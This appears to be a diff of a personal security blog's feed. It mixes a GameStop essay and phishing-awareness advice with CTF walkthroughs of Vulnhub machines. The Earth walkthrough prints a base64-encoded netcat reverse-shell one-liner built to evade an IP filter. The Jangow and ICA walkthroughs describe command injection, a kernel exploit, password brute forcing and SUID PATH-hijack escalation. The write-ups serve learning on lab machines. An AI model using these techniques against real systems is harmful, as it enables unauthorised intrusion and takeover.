+In February of 2021, GameStop appointed Matt Francis to the newly created Chief Technology Officer. In March of 2021, Jenna Owens was appointed to be Chief Operating Officer. Just a month later, Elliot Wilke was appointed as Chief Growth Officer. In June 2021, Mike Recupero was appointed as Chief Financial Officer.</p>
 
-<p>HTTP</p>
+<p>And in the same month, former Amazon executive Matt Furlong was named as Chief Executive Officer of GameStop, replacing George Sherman. With new leadership, GameStop began a venture into the cryptocurrency/NFT market in order to transform itself.</p>
 
-<p>HTTPS
-In order to continue with reconnaissance, I used a few tools. The first was a specific nmap scan of the machine.</p>
+<p>It hit its first bump in October of 2021, when Owens left the company after a “separation agreement”. By the end of the third quarter 2021, GameStop reported losses of over $100 million.</p>
 
-<p>Breaking down the nmap command, -p 22,80,443 just means I’m scanning those ports. I figured since this was an ‘easy’ machine, I really wouldn’t need to scan for more. -O is for the operating system, which you need sudo (root or administrator on Linux) privileges for, and the -sV flag is getting the service versions for those services running. I’m basically just looking for potential vulnerabilities. If outdated versions of services are running, for example, then I can use that to get into the system.</p>
+<p>But the company was just beginning its transformation, so some road blocks were to be expected.</p>
 
-<p>As a side note, when you’re doing this, you should direct the output to a file. I forgot to do that, and when I wanted to get the information again, I had to run a second nmap scan. It’s not a big deal in this scenario, but in an actual penetration test, that is probably a big mistake.</p>
+<p>GameStop announced in 2022 a partnership with Immutable, a blockchain gaming company. In Immutable’s own words on the company website, “Immutable is a global leader in gaming on a mission to bring digital ownership to every player by making it safe and easy to build great web3 games.”</p>
 
-<p>To do a little bit more web enumeration, I used the dirb command, a command line web enumeration tool, in order to find out what directories on the service are running. If you don’t specify the wordlist, it will default to common.txt. That was what I wanted, so I didn’t use any other wordlist for this particular stage. And again, I would definitely append this to a file so you can reference it later.</p>
+<p>Immutable logo
+This partnership was to launch GameStop’s NFT marketplace, which would launch in 2022. The company was still losing money, but another thing happened outside of the company’s control that would doom the NFT push.</p>
 
-<p>The results of the dirb scan said there was one directory, the cgi-bin directory, and that returns a 403 error.</p>
+<p>The public consensus against NFTs shifted. The concept of scarcity in a digital art world would be pretty baffling to anyone who knows how to copy and save images, so the concept was always subject to mockery. Beyond that, as more people began to learn more about NFTs, the more public opinion turned against them.</p>
 
-<p>Up until this point I was using the ip address for nmap and dirb. And while doing that, I couldn’t figure anything out. The versions of http and https didn’t have vulnerabilities that I was going to be able to exploit. It looked like I had hit a dead end. I looked at the certificate again, and I edited my /etc/hosts file to map the hostname to the ip address. After I did that, this web enumeration became a lot easier. You can just use any text editor of choice to map the ip address to ‘earth.local’ and ‘terratest.earth.local’.</p>
+<p>The negative environmental impact of cryptocurrency, the news that some NFTs were stolen from artists who were not selling them, the various schemes and scams that were going around. YouTube videos critical of NFTs earned millions of views.</p>
 
-<p>From the screenshot, there is a user input field that allows me to send a message to Earth. There are previous messages that also look encrypted.</p>
+<p>12 million views as of September 2023
+As someone who was in the digital art world at the time, it was rather interesting to see artists who were heavily pushing NFTs slowly distance themselves from them. It was as if everyone decided that the less said about their embarrassing NFT phase, the better. NFTs were no longer the next big thing, they were a fad that died down when public opinion turned against them.</p>
 
-<p>Doing another dirb scan of both earth.local and terratest.earth.local, there is a new directory, called admin. When I visit there, there is a login field. This is a good discovery, but I don’t really have any useful information. I don’t have usernames and I don’t have passwords.</p>
+<p>By the time GameStop finally launched their NFT platform, nft.gamestop.com, in the middle of 2022, the market for NFTs collapsed.</p>
 
-<p>Also, up until this point, I was using http for the dirb scan. Switching up to https, however, gave me much more detail.</p>
+<p>You can probably guess how GameStop’s NFT venture panned out, but to sumarize: the company is going to pull away from cryptocurrency in November of this year. Matt Furlong was ousted as CEO. The company is still in the same position it was in since the short squeeze that (temporarily) changed the company’s direction.</p>
 
-<p>It specifically gave me a robots.txt file. That file essentially just tells web crawlers what pages they can and can’t visit. Visiting the robots.txt page, one disallowed directory caught my eye. Visiting that page got me a username, and it also got me the encryption method (XOR).</p>
+<p>What is next for GameStop? Ryan Cohen is executive chairman, and he does seem to still believe in the company. Its reputation in the online stock trading community has not wavered. In fact, they’re as dedicated as ever to the company, and GameStop is not going away anytime soon. But what direction the company should go in a world of digital gaming is also uncertain.</p>
 
-<p>And then going to the other page mentioned, testdata.txt, got me this message.</p>
+<p>And I think that’s what makes this story so compelling in my view. I’m not viewing GameStop from the perspective of someone who loved the store. At no point in my life did I love GameStop. I have a vendetta against them that goes back fifteen years. However, through researching GameStop’s struggles to find an identity in an ever changing world, I found myself strangely relating to this corporation.</p>]]></content><author><name></name></author><category term="post" /><category term="post" /><summary type="html"><![CDATA[It was around 2008 when my Playstation3 stopped working. I was 14 years old. My machine got the yellow light of death, and I had sent it to a video game repair company to try to fix it. They weren’t able to, and thanks to my teenage mind’s inability to figure out online payments, never even got my console back (but I also never paid for it!).]]></summary></entry><entry><title type="html">Phishing: Fake Job Postings</title><link href="http://localhost:4000/post/phishing/awareness/2023/06/05/phishing_job.html" rel="alternate" type="text/html" title="Phishing: Fake Job Postings" /><published>2023-06-05T18:53:33-04:00</published><updated>2023-06-05T18:53:33-04:00</updated><id>http://localhost:4000/post/phishing/awareness/2023/06/05/phishing_job</id><content type="html" xml:base="http://localhost:4000/post/phishing/awareness/2023/06/05/phishing_job.html"><![CDATA[<p>Around this time last year, I was a graphic designer and video editor. And one thing I learned while working in that field and trying to find freelance or W2 work, was that there were a lot of fake job postings.</p>
 
-<p>That message, mentioned in the previous page, is the key used. When it comes to encryption, if the key is compromised, then a new key needs to be used asap. You definitely do not want any attackers finding your encryption key. Anything encrypted can be decrypted using the key.</p>
+<p>I would apply for a seemingly legitimate looking position. “Graphic Designer at X Marketing”, for example. A small company that I have never heard of, but they seem legitimate at a first glance. The qualifications/requirements weren’t ridiculous, the pay was good, it was a remote position, the job posting seemed like a dream come true. And then, a few days later, I would get an email from the company.</p>
 
-<p>Trying to decode the first two messages on the web page is useless, they’re just nonsensical messages. The third one is the most important one. To decode it, I went to CyberChef.</p>
+<p>And every red flag went straight up.</p>
 
-<p>This part took a lot of googling on my part, but I found that converting the message From Hex, and then using XOR with the testdata.txt as the key managed to decrypt the message.</p>
+<p>The email would have poor grammar, the email address deliberately misspelled, an immediate job offer without an interview. Requiring that you click on a link in the email, requiring that you download some software through a link in the email, and a dozen more red flags that I can’t even remember.</p>
 
-<p>That looks like it could be something good, like a password. I have a username ‘terra’. Going back to the login page, I tried that as the password, and I was in the system.</p>
+<p>It wasn’t until I did a cybersecurity bootcamp that I learned there was an actual term for this, and it is called ‘phishing.’</p>
 
-<p>And I could run commands. The first thing I wanted to do was set up a netcat listener. I ran ‘which nc’ to make sure the ‘nc’ command was on the machine. It was on the machine, so I could theoretically run it.</p>
+<p>Phishing is a type of attack where a malicious actor attempts to gain personal information, usually by posing as someone else, or a legitimate organization, and contacting their targets through email. Emails that say something like “You Just Won $100,000!”, text messages that say “Your Netflix Account is on hold, please click here to verify your payment info.”</p>
 
-<p>However, when I tried to run it, I ran into that message. I would have to figure out another way of getting into the system. That however, took a while, so before that I decided to run “locate ‘flag’” to see if I could find the first flag just on this CLI interface.</p>
+<p>In the case of a fake job posting, the sensitive information they probably want is a social security number, since being employed by any company requires that information. They most likely want it for other identity theft schemes. Other sensitive information could be your passwords, credit card numbers, or even complete control over your computer. If the fake job posting is for an in-person job, however, the consequences can and probably will be more severe.</p>
 
-<p>With the first flag found, I needed to figure out how I could spawn that shell on the system. The easiest solution would be to see if I could view the /etc/passwd and /etc/shadow file. If I could, then I could just brute force passwords. However, while the /etc/passwd was viewable, /etc/shadow was not.</p>
+<p>In my own experience looking for work as a designer, at some points it seemed like every other job posting was going to lead to a phishing scam. If I look through my email, I could probably find a dozen of them. It has been less severe in my search for a role in cybersecurity, but I do think there are still a few fake job postings I have accidentally applied for. I think there are a few reasons for these fake job postings.</p>
 
-<p>Experimenting with it a bit further, and with a bit more googling and playing around with it, I found that the remote connections are being detected by IP address in the command.</p>
+<ul>
+  <li>
+    <p>A lot of people who are job hunting are going to be looking for a long time. As of this writing, I have been looking for a job for at least two and a half months, and if you go on LinkedIn you’ll find plenty of posts from people who have been looking for a lot longer. That is a long time to be a target.</p>
+  </li>
+  <li>
+    <p>A lot of people apply indiscriminately to job postings without actually reading the job requirements. I myself am guilty of this, but on sites like Indeed and LinkedIn, there are job postings where you can submit an application with just a click of a button. Pretty much every single fake job posting I’ve come across has been some variation of ‘easy apply’. For every fake job posting I’ve gotten a response for, when I actually looked at the posting carefully, I thought to myself “how could I think this was real?”</p>
+  </li>
+</ul>
 
-<p>In the screenshot, even though the command ‘echo’ is not going to set up a remote connection, it is still blocked because of the IP address. As a side note, if you type in an invalid IP address (if any of the numbers are over 255), then it’ll go through. So it’s not only testing the format, it’s also testing if it is a valid IP address.</p>
+<p>-This is just anecdotal, but when I’m job hunting for weeks and months on end without hearing any results, it is a strange euphoria when I actually do get a response. When that response is actually positive, it almost turns off any sense of danger that I might have.</p>
 
-<p>So using that knowledge to set up a listener, I did the following steps. There are probably easier ways to do this, but this is how I did it.</p>
+<p>Luckily I have never fallen for these schemes and I can usually spot them pretty easily. I have a mental list of things I look out for when I get a response I believe is for a fake company, or a fake posting.</p>
 
-<p>Encode the command that I’m going to run on the web CLI. This command is going to set up the listener. Encoding it will ensure that the command will slip through whatever is detecting the IP address. You can probably use any command line encryption method, but I used base64.</p>
+<p>Poor grammar — This is usually the first thing I notice when I’m reading their emails. Missing punctuation, misspelled words, using words incorrectly.</p>
 
-<p>Set up a netcat listener on your port of choice.</p>
+<p>You can’t find the person on LinkedIn — The first thing I do when I receive an email regarding a job is to look the person up on LinkedIn.</p>
 
-<p>On the victim web application, echo the encoded command, pipe the output to be decoded, and then run ‘bash -’ to ensure that the stdin is run as a command. It should look something like this:
-echo “bmMgMTkyLjE2OC41Ni4yMiA0NDQ0IC1lIC9iaW4vYmFzaAo=” | base64 -d | bash -</p>
+<p>Misspelled email address — sometimes I applied for companies that are actually real, and an attacker is pretending to be from that company. If that is the case, one of the biggest tells is to look at the email address. It is usually slightly misspelled. For example, @xdigitalmarketing as the legitimate email, @xdigtalmarketing as the phishing email.</p>
 
-<p>After doing all that, I have a listener on the machine! And to make sure I had some more interface control, I spawned an interactive shell.</p>
+<p>Job offer without an interview — this one kind of goes without saying, but I did one time get a job offer (complete with salary and benefits!) after just applying to the posting. I don’t think it’s controversial to say that every employer is going to want to talk to a prospective employee before hiring them, no matter how amazing their resume may seem.</p>
 
-<p>And now, I had to figure out how to pivot from here. I am currently an apache user, and I need to figure out how to get to root. The first thing I did was run ‘sudo -l’ to figure out what I can run as a sudo user. However, even that required a password, so I figured that wasn’t going to be fruitful.</p>
+<p>They want your social security number — if before even interviewing you, they are mentioning your social security number, run away.</p>
 
-<p>Running the above command finds all binaries where they run as the owner of the file, not as the user who called it. There is a binary called ‘reset_root’. If you try to run that, it fails and says that “all triggers not present”. I figured I needed to find out what those triggers are. Using the strings command, I wanted to see exactly what this binary does. I found that if the binary runs successfully, root’s password will be changed to ‘Earth’. To figure out what exactly the triggers needed to be, I transferred the binary over to my Kali Linux machine. To do that, I just set up a ncat listener on my Kali machine to send any output to a file, and then sent it over on the shell I had on the victim machine.</p>
+<p>They mention credit scores — I once got an email that mentioned my credit score needed to be above a certain number to work for their company.</p>
 
-<p>Then after that, I changed the permissions on the reset_root binary so that it is executable, and then used the ltrace command on it. Ltrace is essentially a command that runs another binary and sees what libraries are called. This is a great way to see what the ‘triggers’ the binary needs.</p>
+<p>None of these things, on their own, would be a huge cause for alarm, except for the last three. However, for fake job emails, I usually see a few of them together.</p>
 
-<p>And I saw what the triggers were for the binary to run successfully. I switched back over to the reverse shell, and I created those files. Then after running the binary, root password was switched to Earth.</p>
+<p>If you’re having trouble figuring out if a job posting is fake or not, in my experience if there is something about it that doesn’t look right, doing my research on the company will usually prove it to be real. Just personally speaking, if something looks too good to be true, it probably is too good to be true.</p>]]></content><author><name></name></author><category term="post" /><category term="phishing" /><category term="awareness" /><category term="post" /><category term="phishing" /><category term="awareness" /><summary type="html"><![CDATA[Around this time last year, I was a graphic designer and video editor. And one thing I learned while working in that field and trying to find freelance or W2 work, was that there were a lot of fake job postings.]]></summary></entry><entry><title type="html">Can you cheat while hacking? Jangow Walkthrough</title><link href="http://localhost:4000/post/hacking/2023/06/05/jangow_walkthrough.html" rel="alternate" type="text/html" title="Can you cheat while hacking? Jangow Walkthrough" /><published>2023-06-05T18:53:33-04:00</published><updated>2023-06-05T18:53:33-04:00</updated><id>http://localhost:4000/post/hacking/2023/06/05/jangow_walkthrough</id><content type="html" xml:base="http://localhost:4000/post/hacking/2023/06/05/jangow_walkthrough.html"><![CDATA[<p>Can You Cheat While Hacking? Jangow Walkthrough
+I want to get back into hacking. Jangow is a vulnerable machine rated as ‘easy’ on Vulnhub, so in order to get back into hacking I figured that a machine like that would be perfect.</p>
 
-<p>And then after that getting the root flag was straightforward. I switched over to root, went to the root directory, and the flag was there.</p>
+<p>In a Capture the Flag like this, there are two flags to get. The first flag is the user flag, and the second is when the hacker gets to the root user.</p>
 
-<p>This was a fun machine, and it is apparently the third in a series (Earth being the third planet from the sun). I think the main thing I learned from this was to basically not overlook anything. There were a few times during this where I was lost because of something I overlooked.</p>]]></content><author><name></name></author><category term="post" /><category term="hacking" /><category term="post" /><category term="hacking" /><summary type="html"><![CDATA[This blog post will be focused on a walkthrough on hacking Vulnhub’s The Planets: Earth machine. There are two flags to be found according to the description: “a user and root flag which include an md5 hash”. The tools covered here will be nmap, dirb, and CyberChef.]]></summary></entry></feed>
+<p>I first created a directory specifically for this machine. I wanted to make sure I put all the files in the same place, and document all my findings.</p>
+
+<p>The next step in this CTF was to get the IP address and make sure it was on the same network as my Kali Linux machine. I know the IP address was in the log in screen, but I did want to do it in a more “official” way. I did this using a simple nmap scan of the network.</p>
+
+<p>After I did that, I also saw that two ports were open. FTP on port 21 and HTTP on port 80. I then tried to see if I could log in to the FTP anonymously. Anonymous FTP logins use the username anonymous and any password, sometimes the anonymous user’s email as a way of documenting who is coming in and out.</p>
+
+<p>That didn’t work, so my next step was to check out the HTTP website. I inspected the page source for any kind of comments in the HTML and JavaScript, but there was nothing there.</p>
+
+<p>Bootstrap is a CSS framework, a way of easily formatting the appearance of a website.</p>
+
+<p>I noticed there was a link on the website to a page called “buscar”. I remembered enough Spanish to recognize it as such, but didn’t remember enough to translate (sorry to all my Spanish teachers from fifth grade to high school).</p>
+
+<p>This looked like this was a way of remote code execution, but I did want to gather a little bit more info.</p>
+
+<p>To do that, I first used nmap -sV to get the service versions of the FTP and HTTP, to see if there were any vulnerabilities.</p>
+
+<p>I then did a dirb scan of the website, although I will admit that I didn’t take a look at this afterwards.</p>
+
+<p>My next move was to actually open up Burpsuite and intercept a request on that buscar page, to play around with it and test if my theory was correct. I opened up the browser in Burpsuite, intercepted a request, and sent it to the repeater.</p>
+
+<p>My theory was correct. I executed whoami, and I got back ‘www-data’. I tested out a few more commands, and I used https://www.urlencoder.org/ to encode them.</p>
+
+<p>I got the /etc/passwd file, and saw the user jangow01. I checked out the /home directory, and saw that this user had a directory. I looked inside, and I found the user.txt flag. Encoding the command to open up that user.txt, I got the first flag.</p>
+
+<p>Important to know the version, and this comes to play later
+Next step was to try to establish a more permanent presence. I first tried to do this by establish a reverse shell.</p>
+
+<p>I have absolutely no idea why, but nothing I did worked. I first tried to do it through executing it through the URL, but that failed.</p>
+
+<p>So I took a look around and found this config.php file in a wordpress directory.</p>
+
+<p>Maybe those were the same credentials for the FTP?</p>
+
+<p>I tried to log in, first with that username and password, but that failed. I then used jangow01, and managed to get in.</p>
+
+<p>The next few steps were quite frustrating, because they were trying to establish a shell on the target machine, and each one failed.</p>
+
+<p>I first made a bash script on my Kali machine, used the FTP credentials to put it in the /tmp directory of the target machine and confirmed that it was on the target machine.</p>
+
+<p>Pro-Tip: Don’t name your reverse shell script ‘reverse_shell.sh’.
+When I tried to execute that file, it still failed.</p>
+
+<p>So at a loss, I decided to do one thing I didn’t really want to do when I started this, but it was quite necessary at this stage, because I had no idea why my efforts to establish a shell weren’t working.</p>
+
+<p>I logged in through the actual machine. Is that cheating? I don’t know, but I did it anyway.</p>
+
+<p>So having (technically) gotten access, I resolved to get to root. Through, researching the kernel version, I found this exploit for this kernel version. I downloaded it to my Kali machine first, compiled it on my kali machine, and used FTP to get it on the target machine.</p>
+
+<p>I don’t think ‘normal_elf’ is a particularly good name for malicious binaries either
+However, there were a few bumps in the road.</p>
+
+<p>First, while on the Jangow machine, I couldn’t use the ‘/’ key. When executing a binary, you need to type ‘./binary_name’. So that was the first problem.</p>
+
+<p>I managed to figure out a way around this, but to my chagrin I got the “version ‘glibc_2.34’ not found”. In this scenario, this just means I shouldn’t have compiled this binary on my Kali machine.</p>
+
+<p>So I went through this again, except I just put the source code on the target machine and compiled it there.</p>
+
+<p>But how did I get around not being able to use the ‘/’ key?</p>
+
+<p>I compiled the source code, which the output was a file named ‘a.out’. I don’t know why, but I wasn’t able to name the output file. I had to figure out a way to get ‘./a.out’ into the command line. I used the find command, and outputted the results of that to a text file.</p>
+
+<p>I then opened up the text file, and then used this ‘$(!!)’ to execute ‘./a.out’. This executed the a.out file, and I finally got to root.</p>]]></content><author><name></name></author><category term="post" /><category term="hacking" /><category term="post" /><category term="hacking" /><summary type="html"><![CDATA[Can You Cheat While Hacking? Jangow Walkthrough I want to get back into hacking. Jangow is a vulnerable machine rated as ‘easy’ on Vulnhub, so in order to get back into hacking I figured that a machine like that would be perfect.]]></summary></entry><entry><title type="html">A Secret Mission: ICA Vulnerable Machine Walkthrough</title><link href="http://localhost:4000/post/hacking/2023/06/05/ICA_walkthrough.html" rel="alternate" type="text/html" title="A Secret Mission: ICA Vulnerable Machine Walkthrough" /><published>2023-06-05T18:53:33-04:00</published><updated>2023-06-05T18:53:33-04:00</updated><id>http://localhost:4000/post/hacking/2023/06/05/ICA_walkthrough</id><content type="html" xml:base="http://localhost:4000/post/hacking/2023/06/05/ICA_walkthrough.html"><![CDATA[<p>“According to information from our intelligence network, ICA is working on a secret project. We need to find out what the project is.</p>
+
+<p>Once you have the access information, send them to us. We will place a backdoor to access the system later. You just focus on what the project is. You will probably have to go through several layers of security. The Agency has full confidence that you will successfully complete this mission. Good Luck, Agent!”</p>
+
+<p>ICA: 1 is a vulnerable machine found on Vulnhub, rated easy. From the description, I knew this was a top secret mission only the top agents in the world could undertake.</p>
+
+<p>To start out, after getting the machine set up on VirtualBox, I made sure it was attached to the same network as my Kali machine.</p>
+
+<p>To do that, I used the nmap command. I like to ouput the results of those scans to a file.</p>
+
+<p>Ports 22, 80, and 3306 were open. I went to the http website to see what I could find.</p>
+
+<p>I inspected the HTML and JavaScript to see if there was anything I could find, but nothing there stood out to me.</p>
+
+<p>The next step was to check the versions of the services that were running, see if there were any vulnerabilities I could exploit. I used nmap again, this time with -sV to get the versions.</p>
+
+<p>And then I did a dirb scan of the website, to find some directories worth looking into.</p>
+
+<p>While that was going on, I researched some vulnerabilties for those versions. I didn’t find anything useful, although that version of apache httpd did have a pretty serious vulnerability, I didn’t think I would be able to exploit it.</p>
+
+<p>I instead decided to look for vulnerabilities in QDPM, the web project management service the website was running. I used searchsploit to try to find something.</p>
+
+<p>Password exposure stood out to me, and it was for the version this website was running too. I looked further into it.</p>
+
+<p>“Password and connection string for the database are stored in a yml file”. This website was also running mysql, so maybe I could find some credentials there. I tested that out and went to the the link in the description: http://192.168.191.6/core/config/databases.yml in this case, and I found what I was looking for.</p>
+
+<p>With a username and password, it was time to try to look around the database. I used mysql to get in, and with that username and password I was able to gain access.</p>
+
+<p>And then it was time to poke around. First thing to do was to see the databases.</p>
+
+<p>Staff looked the most intriguing. I selected staff, and I did find some really juicy information.</p>
+
+<p>Usernames and passwords. The machine was also running ssh, so I might have just found my way in.</p>
+
+<p>First thing to do was to get all the usernames into a text file. I did that using leafpad, but any text editor of choice would do. The second thing to do was to decode the passwords. I did that on the command line, but any online decoder (like Cyberchef) would do.</p>
+
+<p>Then, it was time to use the usernames and passwords to brute force the login. I did that using hydra.</p>
+
+<p>Now I had some passwords that worked, so it was time to get in. I used Travis and his credentials to get in. Although seeing as how Dexter’s role was as a Cyber Security Analyst, maybe I should have used his credentials for the irony?</p>
+
+<p>I was in, and I immediately used the ls command to see what I could find.</p>
+
+<p>Hooray! The first flag! I transfered it over to my Kali machine using scp, and now it was time to get the root flag.</p>
+
+<p>I had another look around. I looked to see what kind of active processes were running and checked to see if I could get the /etc/shadow file (the file with all the hashed passwords).</p>
+
+<p>Some screenshots of my reconnaissance</p>
+
+<p>And then I ran this little command, and found something very interesting.</p>
+
+<p>So this is the find command, with specific parameters to find binaries to run as the owner, not the user who started them. This is a useful privilege escalation technique, because those binaries can be used to gain higher access.</p>
+
+<p>That first binary, /opt/get_access, looked really promising.</p>
+
+<p>I first ran it, and got this output. I used the strings command to take a look at the binary’s human readable parts (I did not take a screenshot, but I should have). Using the strings command on binaries is useful because you can see if the binary calls on other binaries. If their full path isn’t used, then that is a potential security risk.</p>
+
+<p>So this /opt/get_access binary was calling on the cat command. Seeing an exploit, I created a bash script, put it in a file called cat and changed it so it was executable.</p>
+
+<p>There’s actually a big mistake here
+I then changed the PATH variable to include the /tmp directory. When you type a command, ‘ls’ for instance, Linux looks in the PATH variable to see where that binary might be located. Adding the /tmp directory means when the ‘cat’ command is called, it’ll look in there instead of the usual place.</p>
+
+<p>I then called on the /opt/get_access binary in order to get to root.</p>
+
+<p>Unfortunately, the first time I did it, I made a mistake and put ‘bin/bash’ instead of ‘/bin/bash’ in the binary. So I ran the command a few dozen times and wondered why my sinister plot to gain root access had failed.</p>
+
+<p>I did a quick fix, and then when I called on it again, I became root.</p>
+
+<p>I had to use the full path for the ‘cat’ command, due to my previous machinations, but I got the root flag.</p>]]></content><author><name></name></author><category term="post" /><category term="hacking" /><category term="post" /><category term="hacking" /><summary type="html"><![CDATA[“According to information from our intelligence network, ICA is working on a secret project. We need to find out what the project is.]]></summary></entry><entry><title type="html">Under the Wire Cyborg Walkthrough</title><link href="http://localhost:4000/post/networking/2023/05/16/networking_basics.html" rel="alternate" type="text/html" title="Under the Wire Cyborg Walkthrough" /><published>2023-05-16T18:53:33-04:00</published><updated>2023-05-16T18:53:33-04:00</updated><id>http://localhost:4000/post/networking/2023/05/16/networking_basics</id><content type="html" xml:base="http://localhost:4000/post/networking/2023/05/16/networking_basics.html"><![CDATA[<p>Networking Basics: Network Types
+Networking is how computers communicate with each other, how they share and use resources, how they connect to the internet. It’s an important concept for anybody working in IT to understand because it’s critical for business or personal use.</p>
+
+<p>In these series of articles, I’m going to try to explain different networking concepts.I’d like to share what I’ve learned so far, in an effort to encourage understanding and dialogue.</p>
+
+<p>Photo by Jordan Harrison on Unsplash
+For this post, I will first describe the types of networks, and then I will conduct an experiment to demonstrate how a LAN works.</p>
+
+<p>What is a network?</p>
+
+<p>To define a network simply, in computer terms, it’s a collection of devices that can communicate with each other and share resources.</p>
+
+<p>Photo by Marvin Meyer on Unsplash
+Local Area Network</p>
+
+<p>A local area network is a group of devices in the same geographic area, usually in the same building. LANs are designed for fast data transfer, and they’re cheaper to maintain. As an example, an office building with many different devices that are all connected to each other.</p>
+
+<p>As another example, when I was a kid we had things called LAN parties. My friends and I would bring our computers to the same physical location to play games together.</p>
+
+<p>There are wired LANs and wireless LANs. Wired LANs use switches and ethernet cables to connect to each other, while wireless LANs use wireless technology. Wi-Fi is an example of wireless LAN technology.</p>
+
+<p>Wide Area Network</p>
+
+<p>A WAN spans over a large geographic area. It can span across countries, and can cover the globe. The Internet is an example of a WAN.</p>
+
+<p>Personal Area Network</p>
+
+<p>A PAN connects smartphones, tablets, laptops, and other devices together on a personal level. They are typically wireless, although they are wired as well. If you are using bluetooth, then you are using a PAN.</p>
+
+<p>Photo by Brett Jordan on Unsplash
+Metropolitan Area Network</p>
+
+<p>This is a network that connects LANs that span across a city or a town. They typically use fiber optics for their connections.</p>
+
+<p>Storage Area Network</p>
+
+<p>A SAN is a network dedicated to data storage. It is partitioned off from the rest of the network so it isn’t affected by network traffic.</p>
+
+<p>Campus Area Network</p>
+
+<p>CANs connect multiple LANs in similar geographic areas, such as a university campus. These can also be called Corporate Area Networks, as they can be used in large corporate networks as well.</p>
+
+<p>Photo by Parker Gibbons on Unsplash
+To demonstrate how a LAN works and the kind of traffic that it generates, I set up a few virtual machines on my virtualbox to act as a LAN.</p>
+
+<p>I first installed a few machines: a Linux Lite, a Windows, and a Ubuntu Desktop. I made sure that each one had the necessary protocols and ports open. I made sure SSH was running on each of the Linux machines, and I installed apache2 on my Linux Lite machine.</p>
+
+<p>After all three were installed and ready to go, I played around with the networking settings. I tried a few settings, and for this particular experiment, I created a host-only network so that each machine could only communicate with each other.</p>
+
+<p>The initial setup
+When all three were up, I pinged each machine a few times to see if they could communicate with each other. And after that, I used SSH for each machine a few times and sent files over to each machine.</p>
+
+<p>To take the experiment a little bit further, I wanted to set up a DNS server on the Linux Lite machine. I first powered off all the machines. Then I connected the Linux Lite machine to a bridged adapter, so it had internet connectivity to install software. I kept the host-only adapter as well, so that it was connected to my LAN.</p>
+
+<p>Dnsmasq is intended to provide DNS support for LANs, which is perfect for this experiment. For those who do not know, DNS is the protocol that maps IP addresses to domain names. It is the reason why you don’t have to memorize IP addresses when you are browsing the web.</p>
+
+<p>The first thing I did was stop the systemd-resolved service, which would conflict with dnsmasq. Systemd-resolved essentially provides DNS.</p>
+
+<p>Then I ran ‘sudo apt update’ and ‘sudo apt install dnsmasq’ to install dnsmasq.</p>
+
+<p>After that, I played around with the configuration file. The important part here was making sure it was listening for DNS requests on the interface for my LAN. Then I added the new addresses, naming the Windows machine ‘windows.testlan’ and naming the Ubuntu machine ‘ubuntu.testlan’.</p>
+
+<p>After that was done, I went to the Windows machine to configure the DNS for that service, so it uses my new DNS server. I went to ‘Control Panel’, ‘Network and Internet’, then to ‘Network and Sharing Center’. I clicked on ‘Change Adapter Settings’, right clicked on the connection (ethernet in this case), clicked on properties, went to ‘Internet Protocol Version 4 (TCP/IP)’, and then added the IP address of my DNS server there.</p>
+
+<p>How to do it on Windows
+The Ubuntu machine was similar. I clicked on the connection icon in the right hand corner, clicked on ‘wired connection’ , then went to Settings, clicked on IPv4, and set the DNS server to be my own.</p>
+
+<p>How to do it on Ubuntu
+After everything was set up, I went to my Windows machine to ping the Ubuntu machine using the address, to make sure that it worked properly. I did the same thing from my Ubuntu machine.</p>
+
+<p>And then I used SSH to get into each machine using their new addresses.</p>
+
+<p>In a practical sense, configuring a DNS server on a LAN can make accessing the resources of each machine much easier. Even in this experiment, I had to have the IP addresses and the machines they belonged to written down. It was a lot easier after the DNS server was setup. If there was a LAN with a lot more than just three machines, like in an office setting, proper DNS configuration would be beneficial just for everyday use.</p>
+
+<p>In the future, I want to take this LAN setup further by installing additional services to experiment with them, attempting a penetration test of all the machines, and even intentionally cause network problems to troubleshoot.</p>]]></content><author><name></name></author><category term="post" /><category term="networking" /><category term="post" /><category term="networking" /><summary type="html"><![CDATA[Networking Basics: Network Types Networking is how computers communicate with each other, how they share and use resources, how they connect to the internet. It’s an important concept for anybody working in IT to understand because it’s critical for business or personal use.]]></summary></entry><entry><title type="html">Under the Wire Cyborg Walkthrough</title><link href="http://localhost:4000/post/hacking/2023/05/02/cyborg_walkthrough.html" rel="alternate" type="text/html" title="Under the Wire Cyborg Walkthrough" /><published>2023-05-02T18:53:33-04:00</published><updated>2023-05-02T18:53:33-04:00</updated><id>http://localhost:4000/post/hacking/2023/05/02/cyborg_walkthrough</id><content type="html" xml:base="http://localhost:4000/post/hacking/2023/05/02/cyborg_walkthrough.html"><![CDATA[<p>In this post, I am going to be continuing my PowerShell training with a walkthrough of Under the Wire’s Cyborg. The goal of each level is to find the password for the next level using PS. I already have a walkthrough of the previous game, Century. To play these games, you will need an SSH client. I used the recommended Putty.</p>
+
+<p>Cyborg 0
+The credentials to join the game are on UTW’s slack channel. I connected to cyborg.underthewire.tech on port 22, and entered the username and password. After I did that, I was in, and was ready to start playing the game.</p>
+
+<p>Cyborg 1</p>
+
+<p>“The password for cyborg2 is the state that the user Chris Rogers is from as stated within Active Directory”</p>
+
+<p>The state referred to the actual state of the United States, not whether the user was enabled or disabled.</p>
+
+<p>This one required that I find an Active Directory user, which I did with the ‘Get-ADUser’ cmdlet. However, by default that only gave me a limited amount of information.</p>
+
+<p>I needed to specify one more thing, the state that the user was in. To do that, I just added ‘-Properties State’ to the cmdlet.</p>
+
+<p>With kansas being the password, I went to the next round.</p>
+
+<p>Cyborg 2</p>
+
+<p>“The password for cyborg3 is the host A record IP address for CYBORG718W100N PLUS the name of the file on the desktop.”</p>
+
+<p>DNS maps IP addresses to hostnames. Host A records are just the IPv4 addresses of the hostname.</p>
+
+<p>The first thing I did was use ‘Get-ChildItem’ to see the file on the Desktop, which was _ipv4. I could have also used ‘ls’ or ‘dir’.</p>
+
+<p>I then used get-help to see if there were any cmdlets like dig or host that would return DNS records. I found a cmdlet named ‘Resolve-DNSname’, which was exactly what I needed.</p>
+
+<p>The password was 172.31.45.167_ipv4</p>
+
+<p>Cyborg 3</p>
+
+<p>“The password for cyborg4 is the number of users in the Cyborg group within Active Directory PLUS the name of the file on the desktop.”</p>
+
+<p>I used ‘Get-ChildItem’ to see the file.</p>
+
+<p>And then I just had to get the users in the group ‘cyborg’. I used a few cmdlets for that. ‘Get-ADGroup -Filter ‘Name -eq “cyborg”’’ will look for the group with the name ‘cyborg’. ‘Get-ADGroupMember’ gets the users in that group. ‘Measure-Object’ will count how many there are.</p>
+
+<p>The password was 88_objects.</p>
+
+<p>Cyborg 4</p>
+
+<p>“The password for cyborg5 is the PowerShell module name with a version number of 8.9.8.9 PLUS the name of the file on the desktop.”</p>
+
+<p>I first figured out the name of the file.</p>
+
